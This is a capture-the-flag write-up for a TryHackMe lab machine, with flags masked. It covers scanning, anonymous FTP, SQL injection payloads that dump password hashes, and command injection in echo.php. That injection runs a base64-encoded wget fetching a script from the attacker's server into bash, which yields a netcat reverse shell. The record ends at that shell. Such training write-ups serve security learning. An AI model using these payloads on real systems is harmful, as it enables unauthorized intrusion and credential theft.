<h1 align="center"><a href="https://tryhackme.com/room/labyrinth8llv">Minotaur´s Labyrinth</a></h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/fafd67f3-98e5-4151-8d38-7843e392a2db"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAR%2011-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p


<br>
<h2>Task 1 &nbsp;・&nbsp; Find the flags</h2> 
<p>Hi, it's me, Daedalus, the creator of the Labyrinth. I was able to implement some backdoors, but Minotaur was able to (partially) fix them (that's a secret, so don't tell anyone). But let's get back to your task, root this machine and give Minotaur a lesson.<br>

The target machine may take a few minutes to boot up fully.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>What is flag 1? </em><br><a id='1.1'></a>
>> <strong><code>fl4g{•••••••••••••••••••••••}</code></strong><br>
<p></p>

<br>

> 1.2. <em>What is flag 2? </em><br><a id='1.2'></a>
>> <strong><code>fla6{•••••••••••••••••••••••}</code></strong><br>
<p></p>

<br>

> 1.3. <em>What is the user flag </em><br><a id='1.3'></a>
>> <strong><code>fla9{•••••••••••••••••••••}</code></strong><br>
<p></p>

<br>

> 1.4. <em>What is the root flag </em><br><a id='1.4'></a>
>> <strong><code>fL4G{••••••••••••••••••••••}</code></strong><br>
<p></p>

<h2>Port Scanning</h2>
<h3>rustscan</h3>

```bash
:~/Minotaur´sLabyrinth# rustscan -a MachineIP --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.\U0001f422

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open MachineIP:21
Open MachineIP1:22
OpenMachineIP:80
OpenMachineIP:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-11 xx:xx UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at xx:xx
Completed Parallel DNS resolution of 1 host. at xx:xx, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at xx:xx
Scanning MachineIP [4 ports]
Discovered open port 3306/tcp on MachineIP
Discovered open port 22/tcp on MachineIP
Discovered open port 80/tcp on MachineIP
Discovered open port 21/tcp on MachineIP
Completed Connect Scan at xx:xx, 0.00s elapsed (4 total ports)
Initiating Service scan at xx:xx
Scanning 4 services on MachineIP
Completed Service scan at xx:xx, 11.02s elapsed (4 services on 1 host)
NSE: Script scanning MachineIP.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at xx:xx
NSE: [ftp-bounce MachineIP] PORT response: 500 Illegal PORT command
Completed NSE at xx:xx, 0.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.00s elapsed
Nmap scan report for MachineIP
Host is up, received user-set (0.00045s latency).
Scanned at 2026-03-11 xx:xx:xx UTC for 11s

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   MachineIP:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/spayc/minotaur-box
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3306/tcp open  mysql?  syn-ack
| fingerprint-strings: 
|   NULL, RPCCheck: 
|_    Host 'ip-xx-xx-xx-xxx.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host 'ip-xx-xx-xx-xxx.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at xx:xx
Completed NSE at xx:xx, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
```


<h3>nmap</h3>

```bash
:~/Minotaur´sLabyrinth# nmap -p- -vv MachineIP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-11 xx:xx GMT
Initiating Ping Scan at xx:xx
Scanning MachineIP [4 ports]
Completed Ping Scan at xx:xx, 0.03s elapsed (1 total hosts)
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Initiating SYN Stealth Scan at xx:xx
Scanning MachineIP [65535 ports]
Discovered open port 21/tcp on MachineIP
Discovered open port 80/tcp on MachineIP
Discovered open port 22/tcp on MachineIP
Discovered open port 3306/tcp on MachineIP
Completed SYN Stealth Scan at 16:06, 1.87s elapsed (65535 total ports)
Nmap scan report for MachineIP
Host is up, received reset ttl 64 (0.00016s latency).
Scanned at 2026-03-11 xx:xx:xx GMT for 2s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 64
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
           Raw packets sent: 65539 (2.884MB) | Rcvd: 65536 (2.621MB)
```

<p><em>2025-Aug</em></p>

```bash
:~/Minotaur´sLabyrinth# nmap -p- -vv -T4 MachineIP
...
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 64
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
443/tcp  open  https   syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
```

```bash
:~/Minotaur´sLabyrinth# nmap -sC -sV -p- -T4 TargetIP
...
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
443/tcp  open  ssl/http Apache httpd 2.4.48 ((Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1)
|_http-server-header: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
| http-title: Login
|_Requested resource was login.html
| ssl-cert: Subject: commonName=localhost/organizationName=Apache Friends/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2004-xx-xxTxx:xx:xx
|_Not valid after:  2010-xx-xxTxx:xx:xx
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, NULL: 
|_    Host 'ip-xx-xxx-xx-xxx.ec2.internal' is not allowed to connect to this MariaDB server
```

<h2>Vulnerability Assessment</h2>

```bash
:~/Minotaur´sLabyrinth# nikto -h http:/MachineIP
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MachineIP
+ Target Hostname:    MachineIP
+ Target Port:        80
+ Start Time:         2026-03-11 xx:xx:xx (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3268: /imgs/: Directory indexing found.
+ OSVDB-3092: /imgs/: This might be interesting...
+ Server leaks inodes via ETags, header found with file /login.html, fields: 0x8ef 0x5c4d22fe85756 
+ /login.html: Admin login page/section found.
+ /login.php: Admin login page/section found.
+ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2026-03-11 xx:xx:xx (GMT0) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Minotaur´sLabyrinth# nikto -h http:/MachineIP/login.html
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MachineIP
+ Target Hostname:    MachineIP1
+ Target Port:        80
+ Start Time:         2026-03-11 xx:xx:xx (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /login.html, fields: 0x8ef 0x5c4d22fe85756 
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-03-11 xx:xx:xx (GMT0) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Minotaur´sLabyrinth# nikto -h http://MachineIP/login.php
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MachineIP
+ Target Hostname:    MachineIP
+ Target Port:        80
+ Start Time:         2026-03-11 xx:xx:xx5 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ 6544 items checked: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2026-03-11 xx:xx:xx (GMT0) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

```bash
:~/Minotaur´sLabyrinth# nikto -h http://MachineIP/imgs/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          MachineIP
+ Target Hostname:    MachineIP
+ Target Port:        80
+ Start Time:         2026-03-11 xx:xx:xx (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-3268: /imgs/: Directory indexing found.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /imgs/./: Directory indexing found.
+ OSVDB-3268: /imgs/?mod=node&nid=some_thing&op=view: Directory indexing found.
+ OSVDB-3268: /imgs/?mod=some_thing&op=browse: Directory indexing found.
+ /imgs/./: Appending '/./' to a directory allows indexing
+ OSVDB-3268: /imgs//: Directory indexing found.
+ /imgs//: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ OSVDB-3268: /imgs/?Open: Directory indexing found.
+ OSVDB-3268: /imgs/?OpenServer: Directory indexing found.
+ OSVDB-3268: /imgs/%2e/: Directory indexing found.
+ OSVDB-576: /imgs/%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ OSVDB-3268: /imgs/?mod=<script>alert(document.cookie)</script>&op=browse: Directory indexing found.
+ OSVDB-3268: /imgs/?sql_debug=1: Directory indexing found.
+ OSVDB-3268: /imgs///: Directory indexing found.
+ OSVDB-3268: /imgs/?PageServices: Directory indexing found.
+ OSVDB-119: /imgs/?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
+ OSVDB-3268: /imgs/?wp-cs-dump: Directory indexing found.
+ OSVDB-119: /imgs/?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
+ OSVDB-3268: /imgs///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ OSVDB-3288: /imgs///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
+ OSVDB-3268: /imgs/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3268: /imgs/?D=A: Directory indexing found.
+ OSVDB-3268: /imgs/?N=D: Directory indexing found.
+ OSVDB-3268: /imgs/?S=A: Directory indexing found.
+ OSVDB-3268: /imgs/?M=A: Directory indexing found.
+ OSVDB-3268: /imgs/?\"><script>alert('Vulnerable');</script>: Directory indexing found.
+ OSVDB-3268: /imgs/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: Directory indexing found.
+ OSVDB-3268: /imgs/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
+ OSVDB-3268: /imgs/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
+ OSVDB-3268: /imgs/?show=http://cirt.net/rfiinc.txt??: Directory indexing found.
+ OSVDB-3268: /imgs/?-s: Directory indexing found.
+ 6544 items checked: 0 error(s) and 33 item(s) reported on remote host
+ End Time:           2026-03-11 xx:xx:xx (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
:~/Minotaur´sLabyrinth# nikto -h MachineIP
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          TargetIO
+ Target Hostname:    ip-MachineIP.ec2.internal
+ Target Port:        80
+ Start Time:         2025-08-03 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.48 (Unix) OpenSSL/1.1.1k PHP/8.0.7 mod_perl/2.0.11 Perl/v5.32.1
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/8.0.7
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: login.html
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-44056: /sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely.
+ OSVDB-3268: /imgs/: Directory indexing found.
+ OSVDB-3092: /imgs/: This might be interesting...
+ OSVDB-3268: /logs/: Directory indexing found.
+ OSVDB-3092: /logs/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.html: Admin login page/section found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2025-08-03 xx:xx:xx (GMT1) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>FTP</h2>

```bash
:~/Minotaur´sLabyrinth# ftp MachineIP
Connected to MachineIP.
220 ProFTPD Server (ProFTPD) [::ffff:MachineIP]
Name (MachineIP:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
226 Transfer complete
ftp> ls -la
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Jun 15  2021 .
drwxr-xr-x   3 root     root         4096 Jun 15  2021 ..
drwxr-xr-x   3 nobody   nogroup      4096 Jun 15  2021 pub
226 Transfer complete
ftp> cd pub
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15  2021
drwxr-xr-x   3 root     root         4.0k Jun 15  2021 ..
drwxr-xr-x   2 root     root         4.0k Jun 15  2021 .secret
-rw-r--r--   1 root     root          141 Jun 15  2021 message.txt
226 Transfer complete
ftp> mget message.txt
mget message.txt? y
200 PORT command successful
150 Opening BINARY mode data connection for message.txt (141 bytes)
226 Transfer complete
141 bytes received in 0.00 secs (282.7419 kB/s)
ftp> cd .secret
250 CWD command successful
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4.0k Jun 15  2021 .
drwxr-xr-x   3 nobody   nogroup      4.0k Jun 15  2021 ..
-rw-r--r--   1 root     root           30 Jun 15  2021 flag.txt
-rw-r--r--   1 root     root          114 Jun 15  2021 keep_in_mind.txt
226 Transfer complete
ftp> mget flag.txt
mget flag.txt? y
200 PORT command successful
150 Opening BINARY mode data connection for flag.txt (30 bytes)
226 Transfer complete
30 bytes received in 0.00 secs (11.4084 kB/s)
ftp> mget keep_in_mind.txt
mget keep_in_mind.txt? y
200 PORT command successful
150 Opening BINARY mode data connection for keep_in_mind.txt (114 bytes)
226 Transfer complete
114 bytes received in 0.00 secs (279.7189 kB/s)
ftp> exit
221 Goodbye.
```

```bash
:~/Minotaur´sLabyrinth# ls
flag.txt  keep_in_mind.txt  message.txt
```

```bash
:~/Minotaur´sLabyrinth# cat flag.txt
fl4g{•••••••••••••••••••••••}
```

<p>

- Daedalus<br>
- Minotaur</p>

```bash
:~/Minotaur´sLabyrinth# cat message.txt
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
```

<p>

- Daedulus & Timer</p>

```bash
:~/Minotaur´sLabyrinth# cat keep_in_mind.txt
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

<h2>Directory & File Enumeration</h2>
<p>

- <code>200</code> login.html<br>
- <code>301</code> /.git<br>
- <code>301</code> /css<br>
- <code>301</code> /imgs<br>
- <code>301</code> /js<br>
- <code>301</code> /api</p>

```bash
:~/Minotaur´sLabyrinth# gobuster dir -u http://MachineIP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,git,js -t 60 --exclude-length 0,277
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://MachineIP/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0,277
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,git,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 311] [--> http://MachineIP/.git/]
/login.html           (Status: 200) [Size: 2287]
/css                  (Status: 301) [Size: 310] [--> http://MachineIP/css/]
/imgs                 (Status: 301) [Size: 311] [--> http://MachineIP/imgs/]
/js                   (Status: 301) [Size: 309] [--> http://MachineIP/js/]
/api                  (Status: 301) [Size: 310] [--> http://MachineIP/api/]
Progress: 1091375 / 1091380 (100.00%)
===============================================================
Finished
===============================================================
```

<p>/api/<br>

- <code>301</code> /api/people<br>
- <code>301</code> /api/creatures</p>

```bash
:~/Minotaur´sLabyrinth# gobuster dir -u http://MachineIP/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,git,js -t 60 --exclude-length 0,277 -q
/people               (Status: 301) [Size: 317] [--> http://MachineIP/api/people/]
/creatures            (Status: 301) [Size: 320] [--> http://MachineIP/api/creatures/]
```

<p>/js/<br>

- <code>200</code> /js/login.js<br>
- <code>200</code> /api/initi.js</p>

```bash
:~/Minotaur´sLabyrinth# gobuster dir -u http://MachineIP/js/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,git,js -t 60 --exclude-length 277 -q
/login.js             (Status: 200) [Size: 1442]
/init.js              (Status: 200) [Size: 187]
```

<p>/imgs/<br></p>

```bash
:~/Minotaur´sLabyrinth# gobuster dir -u http://MachineIP/imgs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,git,js -t 60 --exclude-length 277 -q
-
```

<p>/.git/<br>

- <code>200</code> /index<br>
- <code>200</code> /config<br>
- <code>200</code> /HEAD<br>
- <code>301</code> / info<br>
- <code>301</code> /logs<br>
- <code>301</code> /objects<br>
- <code>301</code> /branches<br>
- <code>200</code> /HEAD</p>

```bash
:~/Minotaur´sLabyrinth# gobuster dir -u http://MachineIP/.git/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,git,js -t 60  -q --exclude-length 277
/index                (Status: 200) [Size: 2796]
/info                 (Status: 301) [Size: 316] [--> http://MachineIP/.git/info/]
/config               (Status: 200) [Size: 258]
/logs                 (Status: 301) [Size: 316] [--> http://MachineIP/.git/logs/]
/objects              (Status: 301) [Size: 319] [--> http://MachineIP/.git/objects/]
/branches             (Status: 301) [Size: 320] [--> http://MachineIP/.git/branches/]
/refs                 (Status: 301) [Size: 316] [--> http://MachineIP/.git/refs/]
/HEAD                 (Status: 200) [Size: 21]
```


<h2>Web Discovery</h2>

<p>/login.html</p>

<img width="1207" height="725" alt="image" src="https://github.com/user-attachments/assets/230db0d9-9350-4b0c-add1-abce8890b2a9" />

<br>
<br>

<img width="1217" height="681" alt="image" src="https://github.com/user-attachments/assets/37a356af-e08c-4baa-bc21-75df172375fb" />

<br>
<br>
<p>/js/login.js</p>

<img width="1214" height="653" alt="image" src="https://github.com/user-attachments/assets/017dc4e8-e968-4f5d-a727-bc281c5c73f9" />


```bash
function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]b[10]b[5]c[9]c[9]c[1]a[2]a[5]c[0]c[9]b[8]
```

```bash
Daedalus:g2e55kh4ck5r
```

<p>

- Query People: Daedalus.</p>

<img width="954" height="734" alt="image" src="https://github.com/user-attachments/assets/72c7e9d8-ad66-4a94-87d5-f8d1ffedb12a" />

<br>
<br>

<img width="939" height="730" alt="image" src="https://github.com/user-attachments/assets/631386ab-241c-4842-a454-e95a85ec043c" />

<p>

- Query People: ...</p>

```bash
' UNION SELECT 1,2,group_concat(namePeople,":",passwordPeople,":",permissionPeople SEPARATOR '<br>') FROM people;--
```

```bash
1	2	Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e:user
Menekrates:0b3bebe266a81fbfaa79db1604c4e67f:user
Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b:user
Daedalus:_______________________________:user
M!n0taur:--------------------------------:admin
```

<img width="1186" height="760" alt="image" src="https://github.com/user-attachments/assets/37f7db9b-9ada-42ef-a63b-95616c958a16" />

<br>
<br>

<p>

- Query Creatures: ...</p>

```bash
' or 1=1#
```

```bash
1	Cerberos	3898e56bf6fa6ddfc3c0977c514a65a8
2	Pegasus	5d20441c392b68c61592b2159990abfe
3	Chiron	f847149233ae29ec0e1fcf052930c044
4	Centaurus	ea5540126c33fe653bf56e7a686b1770
```

<img width="1211" height="792" alt="image" src="https://github.com/user-attachments/assets/513fab6b-f375-4033-a77c-6b690090f6d1" />

<br>
<br>

<p>

- Navigate to https://md5hashing.net/hash/md5/--------------------------------</p>

<img width="801" height="95" alt="image" src="https://github.com/user-attachments/assets/3473d611-c1ef-4580-8d95-5d1bc2e74a32" />

<p>
	
- M!n0taur:----------<br>
- Log in./p>


<img width="1200" height="580" alt="image" src="https://github.com/user-attachments/assets/975411cd-14da-45c4-ba50-edc8dac73800" />

<br>
<br>

<img width="1322" height="550" alt="image" src="https://github.com/user-attachments/assets/bdcf7645-62fe-4c64-afdb-9f85ef11f494" />

<p>

- Click <code>Secret_Stuff</code></p>

<img width="1312" height="559" alt="image" src="https://github.com/user-attachments/assets/fa428411-7abe-454c-83df-6bd1841a7fee" />


<br>
<br>


<img width="1286" height="566" alt="image" src="https://github.com/user-attachments/assets/bd080187-1475-4a59-a06e-73e8daf8f528" />

<p>

- id</p>

<img width="1286" height="571" alt="image" src="https://github.com/user-attachments/assets/06ebb252-cd1b-432d-92e6-4f202b7c57a7" />


<p>

- whoami</p>

/<img width="1281" height="519" alt="image" src="https://github.com/user-attachments/assets/9f8bc27f-7499-47b6-96a8-1b4b5178695e" />

<br>
<br>
<p>

- pwd</p>

<img width="1275" height="582" alt="image" src="https://github.com/user-attachments/assets/8e69b335-f383-4b94-8158-aee732bbe1b6" />

<br>
<br>
<p>

- ls -lah</p>


<img width="1289" height="573" alt="image" src="https://github.com/user-attachments/assets/35f0bf23-7f8c-4a34-8d3b-d2a0237fa7a5" />

<br>
<br>
<p>

- cat /etc/passed | greh bash<br>
- root<br>
- minotaur<br>
- anonftp<br>
- ubuntu</p>

<img width="1291" height="536" alt="image" src="https://github.com/user-attachments/assets/932b9618-369b-4031-950d-20fd584ac561" />



:~# echo "wget http://AttackIP:8000/s -O /tmp/s" | base64
d2dldCBodHRwOi8vMTAuODAuNzYuMTcyOjgwMDAvcyAtTyAvdG1wL3MK


Navigate to http://10.80.176.100/echo.php?search=hi%0aecho%20d2dldCBodHRwOi8vMTAuODAuNzYuMTcyOjgwMDAvcyAtTyAvdG1wL3MK%20|%20base64%20-d%20|%20bash




```bash
:~/Minotaur´sLabyrinth# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.80.176.100 - - [11/Mar/2026 19:53:19] "GET /s HTTP/1.1" 200 -
```


```bash
http://10.80.176.100/echo.php?search=hi%0Achmod%20777%20/tmp/s
```

```bash
http://10.80.176.100/echo.php?search=hi%0Abash%20/tmp/s
```



<img width="1098" height="493" alt="image" src="https://github.com/user-attachments/assets/fbbeae8e-0cf5-4a5e-a209-e1af60a8ddbd" />

<br>
<br>

```bash
:~/Minotaur´sLabyrinth# nc -nlvp 6666
Listening on 0.0.0.0 6666
Connection received on MachineIP 37408
bash: cannot set terminal process group (856): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
daemon@...:/opt/lampp/htdocs$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@...:/opt/lampp/htdocs$ pwd
pwd
/opt/lampp/htdocs
daemon@...:/opt/lampp/htdocs$ whoami
whoami
daemon
daemon@MachineIP:/opt/lampp/htdocs$ hostname 
hostname
MachineIP
daemon@MachineIP:/opt/lampp/htdocs$ which python3
which python3
/usr/bin/python3
daemon@MachineIP:/opt/lampp/htdocs$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ocs$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
daemon@MachineIP:/opt/lampp/htdocs$ export TERM=xterm
export TERM=xterm
daemon@MachineIP:/opt/lampp/htdocs$ ^Z
[1]+  Stopped                 nc -nlvp 6666
root@MachineIP2:~/Minotaur´sLabyrinth# stty raw -echo; fg
nc -nlvp 6666
```

```bash
